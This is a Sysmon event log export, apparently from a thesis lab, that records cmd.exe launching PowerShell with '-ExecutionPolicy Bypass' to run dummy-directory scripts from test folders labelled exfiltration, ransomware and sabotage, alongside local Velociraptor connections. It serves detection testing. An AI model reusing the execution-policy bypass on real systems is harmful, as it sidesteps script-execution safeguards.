_ts,ID,Timestamp,EventData,ClientId
1783860779912,3,2026-07-12T12:50:59.4125297Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:51:10.716"",
 ""ProcessGuid"": ""{6bc49a7d-8da9-6a53-b005-000000009a01}"",
 ""ProcessId"": 11476,
 ""Image"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"",
 ""User"": ""LT29\\seguridad"",
 ""Protocol"": ""tcp"",
 ""Initiated"": ""true"",
 ""SourceIsIpv6"": ""false"",
 ""SourceIp"": ""192.168.1.143"",
 ""SourceHostname"": ""LT29.ait.us.es"",
 ""SourcePort"": ""50654"",
 ""SourcePortName"": ""-"",
 ""DestinationIsIpv6"": ""false"",
 ""DestinationIp"": ""192.168.1.129"",
 ""DestinationHostname"": ""-"",
 ""DestinationPort"": ""8088"",
 ""DestinationPortName"": ""-""
}",C.364907172793f8c7
1783860779912,1,2026-07-12T12:51:02.2249369Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:51:17.542"",
 ""ProcessGuid"": ""{6bc49a7d-8dc5-6a53-b105-000000009a01}"",
 ""ProcessId"": 2824,
 ""Image"": ""C:\\Windows\\System32\\cmd.exe"",
 ""FileVersion"": ""10.0.19041.746 (WinBuild.160101.0800)"",
 ""Description"": ""Windows Command Processor"",
 ""Product"": ""Microsoft® Windows® Operating System"",
 ""Company"": ""Microsoft Corporation"",
 ""OriginalFileName"": ""Cmd.Exe"",
 ""CommandLine"": ""\""cmd.exe\"" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File \""C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\\TEC-009_Exfiltracion\\crear_directorio_dummy.ps1\"" "",
 ""CurrentDirectory"": ""C:\\Windows\\system32\\"",
 ""User"": ""LT29\\seguridad"",
 ""LogonGuid"": ""{6bc49a7d-7a59-6a53-01ca-280000000000}"",
 ""LogonId"": ""0x28CA01"",
 ""TerminalSessionId"": ""1"",
 ""IntegrityLevel"": ""High"",
 ""Hashes"": ""MD5=8A2122E8162DBEF04694B9C3E0B6CDEE,SHA256=B99D61D874728EDC0918CA0EB10EAB93D381E7367E377406E65963366C874450,IMPHASH=272245E2988E1E430500B852C4FB5E18"",
 ""ParentProcessGuid"": ""{6bc49a7d-7f1e-6a53-1c04-000000009a01}"",
 ""ParentProcessId"": ""12104"",
 ""ParentImage"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"",
 ""ParentCommandLine"": ""\""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"" "",
 ""ParentUser"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783860779912,1,2026-07-12T12:51:02.2678676Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:51:17.571"",
 ""ProcessGuid"": ""{6bc49a7d-8dc5-6a53-b205-000000009a01}"",
 ""ProcessId"": 792,
 ""Image"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"",
 ""FileVersion"": ""10.0.19041.3393 (WinBuild.160101.0800)"",
 ""Description"": ""Windows PowerShell"",
 ""Product"": ""Microsoft® Windows® Operating System"",
 ""Company"": ""Microsoft Corporation"",
 ""OriginalFileName"": ""PowerShell.EXE"",
 ""CommandLine"": ""powershell.exe  -NoProfile -ExecutionPolicy Bypass -File \""C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\\TEC-009_Exfiltracion\\crear_directorio_dummy.ps1\"" "",
 ""CurrentDirectory"": ""C:\\Windows\\system32\\"",
 ""User"": ""LT29\\seguridad"",
 ""LogonGuid"": ""{6bc49a7d-7a59-6a53-01ca-280000000000}"",
 ""LogonId"": ""0x28CA01"",
 ""TerminalSessionId"": ""1"",
 ""IntegrityLevel"": ""High"",
 ""Hashes"": ""MD5=DFD66604CA0898E8E26DF7B1635B6326,SHA256=D23B67799A0DA0143E395BA5DB906A22AB08FAC4BD5581E275B1E0F1B3FAC55C,IMPHASH=88CB9A420410BDA787E305B65518A934"",
 ""ParentProcessGuid"": ""{6bc49a7d-8dc5-6a53-b105-000000009a01}"",
 ""ParentProcessId"": ""2824"",
 ""ParentImage"": ""C:\\Windows\\System32\\cmd.exe"",
 ""ParentCommandLine"": ""\""cmd.exe\"" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File \""C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\\TEC-009_Exfiltracion\\crear_directorio_dummy.ps1\"" "",
 ""ParentUser"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783860779912,11,2026-07-12T12:51:02.4399855Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:51:17.817"",
 ""ProcessGuid"": ""{6bc49a7d-8dc5-6a53-b205-000000009a01}"",
 ""ProcessId"": 792,
 ""Image"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"",
 ""TargetFilename"": ""C:\\Users\\seguridad\\AppData\\Local\\Temp\\__PSScriptPolicyTest_ko15g12c.vik.ps1"",
 ""CreationUtcTime"": ""2026-07-12 12:51:17.817"",
 ""User"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783860779912,1,2026-07-12T12:51:30.2201721Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:51:47.907"",
 ""ProcessGuid"": ""{6bc49a7d-8de3-6a53-b405-000000009a01}"",
 ""ProcessId"": 2880,
 ""Image"": ""C:\\Windows\\System32\\cmd.exe"",
 ""FileVersion"": ""10.0.19041.746 (WinBuild.160101.0800)"",
 ""Description"": ""Windows Command Processor"",
 ""Product"": ""Microsoft® Windows® Operating System"",
 ""Company"": ""Microsoft Corporation"",
 ""OriginalFileName"": ""Cmd.Exe"",
 ""CommandLine"": ""\""cmd.exe\"" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File \""C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\\TEC-007_Ransomware\\crear_directorio_dummy.ps1\"" "",
 ""CurrentDirectory"": ""C:\\Windows\\system32\\"",
 ""User"": ""LT29\\seguridad"",
 ""LogonGuid"": ""{6bc49a7d-7a59-6a53-01ca-280000000000}"",
 ""LogonId"": ""0x28CA01"",
 ""TerminalSessionId"": ""1"",
 ""IntegrityLevel"": ""High"",
 ""Hashes"": ""MD5=8A2122E8162DBEF04694B9C3E0B6CDEE,SHA256=B99D61D874728EDC0918CA0EB10EAB93D381E7367E377406E65963366C874450,IMPHASH=272245E2988E1E430500B852C4FB5E18"",
 ""ParentProcessGuid"": ""{6bc49a7d-7f1e-6a53-1c04-000000009a01}"",
 ""ParentProcessId"": ""12104"",
 ""ParentImage"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"",
 ""ParentCommandLine"": ""\""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"" "",
 ""ParentUser"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783860779912,1,2026-07-12T12:51:30.260563Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:51:47.937"",
 ""ProcessGuid"": ""{6bc49a7d-8de3-6a53-b505-000000009a01}"",
 ""ProcessId"": 4128,
 ""Image"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"",
 ""FileVersion"": ""10.0.19041.3393 (WinBuild.160101.0800)"",
 ""Description"": ""Windows PowerShell"",
 ""Product"": ""Microsoft® Windows® Operating System"",
 ""Company"": ""Microsoft Corporation"",
 ""OriginalFileName"": ""PowerShell.EXE"",
 ""CommandLine"": ""powershell.exe  -NoProfile -ExecutionPolicy Bypass -File \""C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\\TEC-007_Ransomware\\crear_directorio_dummy.ps1\"" "",
 ""CurrentDirectory"": ""C:\\Windows\\system32\\"",
 ""User"": ""LT29\\seguridad"",
 ""LogonGuid"": ""{6bc49a7d-7a59-6a53-01ca-280000000000}"",
 ""LogonId"": ""0x28CA01"",
 ""TerminalSessionId"": ""1"",
 ""IntegrityLevel"": ""High"",
 ""Hashes"": ""MD5=DFD66604CA0898E8E26DF7B1635B6326,SHA256=D23B67799A0DA0143E395BA5DB906A22AB08FAC4BD5581E275B1E0F1B3FAC55C,IMPHASH=88CB9A420410BDA787E305B65518A934"",
 ""ParentProcessGuid"": ""{6bc49a7d-8de3-6a53-b405-000000009a01}"",
 ""ParentProcessId"": ""2880"",
 ""ParentImage"": ""C:\\Windows\\System32\\cmd.exe"",
 ""ParentCommandLine"": ""\""cmd.exe\"" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File \""C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\\TEC-007_Ransomware\\crear_directorio_dummy.ps1\"" "",
 ""ParentUser"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783860779912,11,2026-07-12T12:51:30.6682801Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:51:48.321"",
 ""ProcessGuid"": ""{6bc49a7d-8de3-6a53-b505-000000009a01}"",
 ""ProcessId"": 4128,
 ""Image"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"",
 ""TargetFilename"": ""C:\\Users\\seguridad\\AppData\\Local\\Temp\\__PSScriptPolicyTest_rt3t2ksq.evy.ps1"",
 ""CreationUtcTime"": ""2026-07-12 12:51:48.321"",
 ""User"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783860779912,1,2026-07-12T12:51:46.133406Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:52:01.676"",
 ""ProcessGuid"": ""{6bc49a7d-8df1-6a53-b705-000000009a01}"",
 ""ProcessId"": 6732,
 ""Image"": ""C:\\Windows\\System32\\cmd.exe"",
 ""FileVersion"": ""10.0.19041.746 (WinBuild.160101.0800)"",
 ""Description"": ""Windows Command Processor"",
 ""Product"": ""Microsoft® Windows® Operating System"",
 ""Company"": ""Microsoft Corporation"",
 ""OriginalFileName"": ""Cmd.Exe"",
 ""CommandLine"": ""\""cmd.exe\"" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File \""C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\\TEC-008_Sabotaje\\crear_directorio_dummy.ps1\"" "",
 ""CurrentDirectory"": ""C:\\Windows\\system32\\"",
 ""User"": ""LT29\\seguridad"",
 ""LogonGuid"": ""{6bc49a7d-7a59-6a53-01ca-280000000000}"",
 ""LogonId"": ""0x28CA01"",
 ""TerminalSessionId"": ""1"",
 ""IntegrityLevel"": ""High"",
 ""Hashes"": ""MD5=8A2122E8162DBEF04694B9C3E0B6CDEE,SHA256=B99D61D874728EDC0918CA0EB10EAB93D381E7367E377406E65963366C874450,IMPHASH=272245E2988E1E430500B852C4FB5E18"",
 ""ParentProcessGuid"": ""{6bc49a7d-7f1e-6a53-1c04-000000009a01}"",
 ""ParentProcessId"": ""12104"",
 ""ParentImage"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"",
 ""ParentCommandLine"": ""\""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"" "",
 ""ParentUser"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783860779912,1,2026-07-12T12:51:46.1865766Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:52:01.706"",
 ""ProcessGuid"": ""{6bc49a7d-8df1-6a53-b805-000000009a01}"",
 ""ProcessId"": 11360,
 ""Image"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"",
 ""FileVersion"": ""10.0.19041.3393 (WinBuild.160101.0800)"",
 ""Description"": ""Windows PowerShell"",
 ""Product"": ""Microsoft® Windows® Operating System"",
 ""Company"": ""Microsoft Corporation"",
 ""OriginalFileName"": ""PowerShell.EXE"",
 ""CommandLine"": ""powershell.exe  -NoProfile -ExecutionPolicy Bypass -File \""C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\\TEC-008_Sabotaje\\crear_directorio_dummy.ps1\"" "",
 ""CurrentDirectory"": ""C:\\Windows\\system32\\"",
 ""User"": ""LT29\\seguridad"",
 ""LogonGuid"": ""{6bc49a7d-7a59-6a53-01ca-280000000000}"",
 ""LogonId"": ""0x28CA01"",
 ""TerminalSessionId"": ""1"",
 ""IntegrityLevel"": ""High"",
 ""Hashes"": ""MD5=DFD66604CA0898E8E26DF7B1635B6326,SHA256=D23B67799A0DA0143E395BA5DB906A22AB08FAC4BD5581E275B1E0F1B3FAC55C,IMPHASH=88CB9A420410BDA787E305B65518A934"",
 ""ParentProcessGuid"": ""{6bc49a7d-8df1-6a53-b705-000000009a01}"",
 ""ParentProcessId"": ""6732"",
 ""ParentImage"": ""C:\\Windows\\System32\\cmd.exe"",
 ""ParentCommandLine"": ""\""cmd.exe\"" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File \""C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\\TEC-008_Sabotaje\\crear_directorio_dummy.ps1\"" "",
 ""ParentUser"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783860779912,11,2026-07-12T12:51:46.626634Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:52:02.040"",
 ""ProcessGuid"": ""{6bc49a7d-8df1-6a53-b805-000000009a01}"",
 ""ProcessId"": 11360,
 ""Image"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"",
 ""TargetFilename"": ""C:\\Users\\seguridad\\AppData\\Local\\Temp\\__PSScriptPolicyTest_msgwudux.c0x.ps1"",
 ""CreationUtcTime"": ""2026-07-12 12:52:02.040"",
 ""User"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783860779912,3,2026-07-12T12:51:58.0380338Z,"{
 ""RuleName"": ""Usermode"",
 ""UtcTime"": ""2026-07-12 12:52:10.158"",
 ""ProcessGuid"": ""{6bc49a7d-7cd5-6a53-7102-000000009a01}"",
 ""ProcessId"": 5276,
 ""Image"": ""C:\\Users\\seguridad\\Desktop\\TFM\\Velociraptor\\velociraptor-v0.75.6-windows-amd64.exe"",
 ""User"": ""LT29\\seguridad"",
 ""Protocol"": ""tcp"",
 ""Initiated"": ""false"",
 ""SourceIsIpv6"": ""true"",
 ""SourceIp"": ""0:0:0:0:0:0:0:1"",
 ""SourceHostname"": ""LT29.ait.us.es"",
 ""SourcePort"": ""50657"",
 ""SourcePortName"": ""-"",
 ""DestinationIsIpv6"": ""true"",
 ""DestinationIp"": ""0:0:0:0:0:0:0:1"",
 ""DestinationHostname"": ""LT29.ait.us.es"",
 ""DestinationPort"": ""8443"",
 ""DestinationPortName"": ""-""
}",C.364907172793f8c7
1783860779912,3,2026-07-12T12:51:59.2801181Z,"{
 ""RuleName"": ""Usermode"",
 ""UtcTime"": ""2026-07-12 12:52:10.364"",
 ""ProcessGuid"": ""{6bc49a7d-7cd5-6a53-7102-000000009a01}"",
 ""ProcessId"": 5276,
 ""Image"": ""C:\\Users\\seguridad\\Desktop\\TFM\\Velociraptor\\velociraptor-v0.75.6-windows-amd64.exe"",
 ""User"": ""LT29\\seguridad"",
 ""Protocol"": ""tcp"",
 ""Initiated"": ""false"",
 ""SourceIsIpv6"": ""true"",
 ""SourceIp"": ""0:0:0:0:0:0:0:1"",
 ""SourceHostname"": ""LT29.ait.us.es"",
 ""SourcePort"": ""50658"",
 ""SourcePortName"": ""-"",
 ""DestinationIsIpv6"": ""true"",
 ""DestinationIp"": ""0:0:0:0:0:0:0:1"",
 ""DestinationHostname"": ""LT29.ait.us.es"",
 ""DestinationPort"": ""8443"",
 ""DestinationPortName"": ""-""
}",C.364907172793f8c7
1783860779912,1,2026-07-12T12:52:05.6225345Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:52:15.575"",
 ""ProcessGuid"": ""{6bc49a7d-8dff-6a53-b905-000000009a01}"",
 ""ProcessId"": 10604,
 ""Image"": ""C:\\Windows\\System32\\cmd.exe"",
 ""FileVersion"": ""10.0.19041.746 (WinBuild.160101.0800)"",
 ""Description"": ""Windows Command Processor"",
 ""Product"": ""Microsoft® Windows® Operating System"",
 ""Company"": ""Microsoft Corporation"",
 ""OriginalFileName"": ""Cmd.Exe"",
 ""CommandLine"": ""\""cmd.exe\"" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File \""C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\\TEC-009_Exfiltracion\\crear_directorio_dummy.ps1\"" "",
 ""CurrentDirectory"": ""C:\\Windows\\system32\\"",
 ""User"": ""LT29\\seguridad"",
 ""LogonGuid"": ""{6bc49a7d-7a59-6a53-01ca-280000000000}"",
 ""LogonId"": ""0x28CA01"",
 ""TerminalSessionId"": ""1"",
 ""IntegrityLevel"": ""High"",
 ""Hashes"": ""MD5=8A2122E8162DBEF04694B9C3E0B6CDEE,SHA256=B99D61D874728EDC0918CA0EB10EAB93D381E7367E377406E65963366C874450,IMPHASH=272245E2988E1E430500B852C4FB5E18"",
 ""ParentProcessGuid"": ""{6bc49a7d-7f1e-6a53-1c04-000000009a01}"",
 ""ParentProcessId"": ""12104"",
 ""ParentImage"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"",
 ""ParentCommandLine"": ""\""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"" "",
 ""ParentUser"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783860779912,1,2026-07-12T12:52:05.7157265Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:52:15.614"",
 ""ProcessGuid"": ""{6bc49a7d-8dff-6a53-ba05-000000009a01}"",
 ""ProcessId"": 8736,
 ""Image"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"",
 ""FileVersion"": ""10.0.19041.3393 (WinBuild.160101.0800)"",
 ""Description"": ""Windows PowerShell"",
 ""Product"": ""Microsoft® Windows® Operating System"",
 ""Company"": ""Microsoft Corporation"",
 ""OriginalFileName"": ""PowerShell.EXE"",
 ""CommandLine"": ""powershell.exe  -NoProfile -ExecutionPolicy Bypass -File \""C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\\TEC-009_Exfiltracion\\crear_directorio_dummy.ps1\"" "",
 ""CurrentDirectory"": ""C:\\Windows\\system32\\"",
 ""User"": ""LT29\\seguridad"",
 ""LogonGuid"": ""{6bc49a7d-7a59-6a53-01ca-280000000000}"",
 ""LogonId"": ""0x28CA01"",
 ""TerminalSessionId"": ""1"",
 ""IntegrityLevel"": ""High"",
 ""Hashes"": ""MD5=DFD66604CA0898E8E26DF7B1635B6326,SHA256=D23B67799A0DA0143E395BA5DB906A22AB08FAC4BD5581E275B1E0F1B3FAC55C,IMPHASH=88CB9A420410BDA787E305B65518A934"",
 ""ParentProcessGuid"": ""{6bc49a7d-8dff-6a53-b905-000000009a01}"",
 ""ParentProcessId"": ""10604"",
 ""ParentImage"": ""C:\\Windows\\System32\\cmd.exe"",
 ""ParentCommandLine"": ""\""cmd.exe\"" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File \""C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\\TEC-009_Exfiltracion\\crear_directorio_dummy.ps1\"" "",
 ""ParentUser"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783860779912,11,2026-07-12T12:52:06.2827645Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:52:16.041"",
 ""ProcessGuid"": ""{6bc49a7d-8dff-6a53-ba05-000000009a01}"",
 ""ProcessId"": 8736,
 ""Image"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"",
 ""TargetFilename"": ""C:\\Users\\seguridad\\AppData\\Local\\Temp\\__PSScriptPolicyTest_fwlzlzma.ihq.ps1"",
 ""CreationUtcTime"": ""2026-07-12 12:52:16.041"",
 ""User"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783860889375,3,2026-07-12T12:53:19.4701211Z,"{
 ""RuleName"": ""Usermode"",
 ""UtcTime"": ""2026-07-12 12:53:30.650"",
 ""ProcessGuid"": ""{6bc49a7d-7cd5-6a53-7102-000000009a01}"",
 ""ProcessId"": 5276,
 ""Image"": ""C:\\Users\\seguridad\\Desktop\\TFM\\Velociraptor\\velociraptor-v0.75.6-windows-amd64.exe"",
 ""User"": ""LT29\\seguridad"",
 ""Protocol"": ""tcp"",
 ""Initiated"": ""false"",
 ""SourceIsIpv6"": ""true"",
 ""SourceIp"": ""0:0:0:0:0:0:0:1"",
 ""SourceHostname"": ""LT29.ait.us.es"",
 ""SourcePort"": ""50665"",
 ""SourcePortName"": ""-"",
 ""DestinationIsIpv6"": ""true"",
 ""DestinationIp"": ""0:0:0:0:0:0:0:1"",
 ""DestinationHostname"": ""LT29.ait.us.es"",
 ""DestinationPort"": ""8443"",
 ""DestinationPortName"": ""-""
}",C.364907172793f8c7
1783860889375,3,2026-07-12T12:53:19.4701714Z,"{
 ""RuleName"": ""Usermode"",
 ""UtcTime"": ""2026-07-12 12:53:30.747"",
 ""ProcessGuid"": ""{6bc49a7d-7cd5-6a53-7102-000000009a01}"",
 ""ProcessId"": 5276,
 ""Image"": ""C:\\Users\\seguridad\\Desktop\\TFM\\Velociraptor\\velociraptor-v0.75.6-windows-amd64.exe"",
 ""User"": ""LT29\\seguridad"",
 ""Protocol"": ""tcp"",
 ""Initiated"": ""false"",
 ""SourceIsIpv6"": ""true"",
 ""SourceIp"": ""0:0:0:0:0:0:0:1"",
 ""SourceHostname"": ""LT29.ait.us.es"",
 ""SourcePort"": ""50666"",
 ""SourcePortName"": ""-"",
 ""DestinationIsIpv6"": ""true"",
 ""DestinationIp"": ""0:0:0:0:0:0:0:1"",
 ""DestinationHostname"": ""LT29.ait.us.es"",
 ""DestinationPort"": ""8443"",
 ""DestinationPortName"": ""-""
}",C.364907172793f8c7
1783860889375,3,2026-07-12T12:54:45.6532209Z,"{
 ""RuleName"": ""Usermode"",
 ""UtcTime"": ""2026-07-12 12:54:56.765"",
 ""ProcessGuid"": ""{6bc49a7d-7cd5-6a53-7102-000000009a01}"",
 ""ProcessId"": 5276,
 ""Image"": ""C:\\Users\\seguridad\\Desktop\\TFM\\Velociraptor\\velociraptor-v0.75.6-windows-amd64.exe"",
 ""User"": ""LT29\\seguridad"",
 ""Protocol"": ""tcp"",
 ""Initiated"": ""false"",
 ""SourceIsIpv6"": ""true"",
 ""SourceIp"": ""0:0:0:0:0:0:0:1"",
 ""SourceHostname"": ""LT29.ait.us.es"",
 ""SourcePort"": ""50673"",
 ""SourcePortName"": ""-"",
 ""DestinationIsIpv6"": ""true"",
 ""DestinationIp"": ""0:0:0:0:0:0:0:1"",
 ""DestinationHostname"": ""LT29.ait.us.es"",
 ""DestinationPort"": ""8443"",
 ""DestinationPortName"": ""-""
}",C.364907172793f8c7
1783860889375,3,2026-07-12T12:54:45.6532409Z,"{
 ""RuleName"": ""Usermode"",
 ""UtcTime"": ""2026-07-12 12:54:56.776"",
 ""ProcessGuid"": ""{6bc49a7d-7cd5-6a53-7102-000000009a01}"",
 ""ProcessId"": 5276,
 ""Image"": ""C:\\Users\\seguridad\\Desktop\\TFM\\Velociraptor\\velociraptor-v0.75.6-windows-amd64.exe"",
 ""User"": ""LT29\\seguridad"",
 ""Protocol"": ""tcp"",
 ""Initiated"": ""false"",
 ""SourceIsIpv6"": ""true"",
 ""SourceIp"": ""0:0:0:0:0:0:0:1"",
 ""SourceHostname"": ""LT29.ait.us.es"",
 ""SourcePort"": ""50674"",
 ""SourcePortName"": ""-"",
 ""DestinationIsIpv6"": ""true"",
 ""DestinationIp"": ""0:0:0:0:0:0:0:1"",
 ""DestinationHostname"": ""LT29.ait.us.es"",
 ""DestinationPort"": ""8443"",
 ""DestinationPortName"": ""-""
}",C.364907172793f8c7
1783861038826,11,2026-07-12T12:55:37.5467058Z,"{
 ""RuleName"": ""Downloads"",
 ""UtcTime"": ""2026-07-12 12:55:14.522"",
 ""ProcessGuid"": ""{6bc49a7d-7ce0-6a53-7a02-000000009a01}"",
 ""ProcessId"": 9348,
 ""Image"": ""C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe"",
 ""TargetFilename"": ""C:\\Users\\seguridad\\Downloads\\e60c0095-fc0f-4e78-adf4-28f07faed845.tmp"",
 ""CreationUtcTime"": ""2026-07-12 12:55:14.521"",
 ""User"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783861038826,3,2026-07-12T12:55:49.6262267Z,"{
 ""RuleName"": ""Usermode"",
 ""UtcTime"": ""2026-07-12 12:56:00.810"",
 ""ProcessGuid"": ""{6bc49a7d-7cd5-6a53-7102-000000009a01}"",
 ""ProcessId"": 5276,
 ""Image"": ""C:\\Users\\seguridad\\Desktop\\TFM\\Velociraptor\\velociraptor-v0.75.6-windows-amd64.exe"",
 ""User"": ""LT29\\seguridad"",
 ""Protocol"": ""tcp"",
 ""Initiated"": ""false"",
 ""SourceIsIpv6"": ""true"",
 ""SourceIp"": ""0:0:0:0:0:0:0:1"",
 ""SourceHostname"": ""LT29.ait.us.es"",
 ""SourcePort"": ""50677"",
 ""SourcePortName"": ""-"",
 ""DestinationIsIpv6"": ""true"",
 ""DestinationIp"": ""0:0:0:0:0:0:0:1"",
 ""DestinationHostname"": ""LT29.ait.us.es"",
 ""DestinationPort"": ""8443"",
 ""DestinationPortName"": ""-""
}",C.364907172793f8c7
1783861038826,3,2026-07-12T12:55:49.6262507Z,"{
 ""RuleName"": ""Usermode"",
 ""UtcTime"": ""2026-07-12 12:56:00.816"",
 ""ProcessGuid"": ""{6bc49a7d-7cd5-6a53-7102-000000009a01}"",
 ""ProcessId"": 5276,
 ""Image"": ""C:\\Users\\seguridad\\Desktop\\TFM\\Velociraptor\\velociraptor-v0.75.6-windows-amd64.exe"",
 ""User"": ""LT29\\seguridad"",
 ""Protocol"": ""tcp"",
 ""Initiated"": ""false"",
 ""SourceIsIpv6"": ""true"",
 ""SourceIp"": ""0:0:0:0:0:0:0:1"",
 ""SourceHostname"": ""LT29.ait.us.es"",
 ""SourcePort"": ""50678"",
 ""SourcePortName"": ""-"",
 ""DestinationIsIpv6"": ""true"",
 ""DestinationIp"": ""0:0:0:0:0:0:0:1"",
 ""DestinationHostname"": ""LT29.ait.us.es"",
 ""DestinationPort"": ""8443"",
 ""DestinationPortName"": ""-""
}",C.364907172793f8c7
1783861038826,11,2026-07-12T12:55:53.5055483Z,"{
 ""RuleName"": ""Downloads"",
 ""UtcTime"": ""2026-07-12 12:55:29.566"",
 ""ProcessGuid"": ""{6bc49a7d-7ce0-6a53-7a02-000000009a01}"",
 ""ProcessId"": 9348,
 ""Image"": ""C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe"",
 ""TargetFilename"": ""C:\\Users\\seguridad\\Downloads\\c9092398-f8e9-4510-b3e6-4c39babd1566.tmp"",
 ""CreationUtcTime"": ""2026-07-12 12:55:29.565"",
 ""User"": ""LT29\\seguridad""
}",C.364907172793f8c7
